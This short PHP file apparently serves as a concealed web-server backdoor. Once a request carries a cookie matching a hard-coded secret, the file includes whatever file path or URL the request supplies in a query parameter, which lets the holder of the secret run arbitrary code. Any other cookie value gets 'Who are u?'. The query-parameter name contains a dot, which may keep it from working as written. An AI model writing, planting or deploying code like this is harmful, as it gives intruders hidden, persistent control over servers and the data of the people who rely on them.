<?php


if (isset($_COOKIE['checked'])) {
    if ($_COOKIE['checked'] !== 'NNNNNNNNNNNNNNNNNNNN'){
        echo 'Who are u?';
        exit();
    }

    include ($_GET['ouff.php']);
}